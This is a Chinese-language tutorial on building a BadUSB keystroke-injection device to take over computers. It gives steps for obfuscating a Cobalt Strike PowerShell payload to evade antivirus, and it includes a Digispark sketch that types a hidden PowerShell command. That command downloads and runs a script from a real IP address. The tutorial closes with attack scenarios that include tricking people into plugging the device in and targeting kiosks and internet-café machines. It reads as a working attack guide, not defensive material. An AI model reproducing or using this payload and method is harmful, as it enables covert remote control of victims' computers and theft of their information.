  
![image.png](https://image.3001.net/images/20211021/1634786703_6170dd8fc1710ce162a99.png!small)

在电影《黑客军团》中出现在停车场丢badusb来进行钓鱼

## 简介

通过硬件直接插入对方电脑，让对方电脑执行代码，达到干扰、控制主机或者窃取信息等目的。

## 威胁

BadUSB的威胁在于：恶意代码存在于U盘的固件中，PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB的攻击。

## 攻击流程

BadUsb插入后，会模拟键盘鼠标对电脑进行操作，通过这些操作打开电脑的命令终端，并执行一条命令，这条命令将从指定网址下载其他代码并于后台静默运行。这些代码功能包括：窃取信息、反弹shell、发送邮件等，从而实现控制目标机或者窃取信息的目的。

### 一.powershell免杀马制作过程

  * 打开cs工具生成Powershell脚本放置于桌面

  * ![image.png](https://image.3001.net/images/20211021/1634786775_6170ddd72d904bcd29480.png!small)

  * 以下是其源码部分（未过免杀)  
![image.png](https://image.3001.net/images/20211021/1634786792_6170dde8a2cefc26ec451.png!small)

我们采用编码的方式进行免杀绕过

采用Invoke-Obfuscation脚本对其进行编码从而绕过杀毒软件的检测

  * 下载地址:https://github.com/danielbohannon/Invoke-Obfuscation  
![image.png](https://image.3001.net/images/20211021/1634786814_6170ddfe205e8b5e16b69.png!small)

  * 下载解压后使用powershell进入文件位置

#输入以下命令  
Import-Module .\Invoke-Obfuscation.psd1  
Invoke-Obfuscation

![image.png](https://image.3001.net/images/20211021/1634786830_6170de0e7a4311effd7eb.png!small)

    
    
    set scriptpath +你需要编码的powershell文件
    encoding
    1
    

![image.png](https://image.3001.net/images/20211021/1634786855_6170de270ef3fe0f1891d.png!small)

  * 然后将其输出文本

![image.png](https://image.3001.net/images/20211021/1634786870_6170de361c782e893a8e5.png!small)

  * 以下是验毒报告（基本上国内主流的杀毒软件都能过）

![image.png](https://image.3001.net/images/20211021/1634786889_6170de49810f114ddcef4.png!small)

  * 将经过免杀的powershell脚本挂载至服务器上

![image.png](https://image.3001.net/images/20211021/1634786904_6170de58e59edded7e0da.png!small)

### 二.badusb制作过程

下载Arduino IDE并完成相关配置

下载地址：https://downloads.arduino.cc/arduino-1.8.16-windows.zip

下载完成后解压，打开程序exe  
![image.png](https://image.3001.net/images/20211021/1634786920_6170de689535979bf52f1.png!small)

点击文件->首选项  
![image.png](https://image.3001.net/images/20211021/1634786951_6170de87830f3e863e0d3.png!small)

在附加开发版管理器网址处添加 http://digistump.com/package_digistump_index.json

再点击好  
![image.png](https://image.3001.net/images/20211021/1634786975_6170de9f725745a48ab43.png!small)

在工具->开发板:"Arduino Leonardo"->开发板管理器  
![image.png](https://image.3001.net/images/20211021/1634786994_6170deb2f39acc339f800.png!small)

找到 digistump avr boards进行下载

![image.png](https://image.3001.net/images/20211021/1634787016_6170dec865f9acd8cb949.png!small)

之后再开发板处选择digispark(default-16.5mhz)  
![image.png](https://image.3001.net/images/20211021/1634787042_6170dee20f5553113c6dc.png!small)  
安装驱动使用digistump drivers  
![image.png](https://image.3001.net/images/20211021/1634787054_6170deee319949005e5d8.png!small)

至此环境配置结束

### 三.上传代码至badusb

    
    
    #include "DigiKeyboard.h"
    #define KEY_ESC     41
    #define KEY_BACKSPACE 42
    #define KEY_TAB     43
    #define KEY_PRT_SCR 70
    #define KEY_DELETE  76
     
    void setup() {
     
    DigiKeyboard.delay(5000);#插入di待5秒
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(3000);
    DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);#输入windwos键+R
    DigiKeyboard.delay(1000);#延时1秒
    DigiKeyboard.print(F("powershell -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString('http://45.77.23.174/bypass.ps1');"));#输入powershell的攻击代码
    DigiKeyboard.delay(500);#延时0.5秒
    DigiKeyboard.sendKeyStroke(KEY_ENTER);#回车
    DigiKeyboard.delay(750);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);#回车
     
    }
    void loop() {
    }
    

将代码贴至Arduino点击上传

![image.png](https://image.3001.net/images/20211021/1634787072_6170df009cecd20a9d3b3.png!small)

出现如下图，插上我们准备的badusb

![image.png](https://image.3001.net/images/20211021/1634787084_6170df0c03beeaeafdaa3.png!small)

直至出现thank you,此时我们的badusb就已经做好了  
![image.png](https://image.3001.net/images/20211021/1634787095_6170df174b705285a460c.png!small)

### 四.测试

插上badusb后1分钟发现我们的cs上线

![image.png](https://image.3001.net/images/20211021/1634787124_6170df340a98f789eb6af.png!small)

### 五.攻击场景

1.社工攻击

小姐姐小姐姐，我的电脑坏了，插不了U盘，你的借我插一下呗

![image.png](https://image.3001.net/images/20211021/1634787138_6170df42256f1b372721f.png!small)

2.带有USB接口的终端机

各场所终端机器，找到USB接口怼进去  
![image.png](https://image.3001.net/images/20211021/1634787159_6170df57acc9fecd15465.png!small)

3.网吧电脑

参考文献

    
    
    #powershell免杀文章
    https://mp.weixin.qq.com/s/eRD2AMLfPenUYYjA-SVQLQ
    https://www.cnblogs.com/chen-w/p/14726549.html
    #badusb制作视频教程
    https://zhuanlan.zhihu.com/p/110364573
    Arduino配置：
    #解决dns污染的问题
    https://www.arduino.cn/thread-102556-1-1.html
    #利用BadUSB穿透3层内网
    https://blog.csdn.net/weixin_44151971/article/details/85063030
    

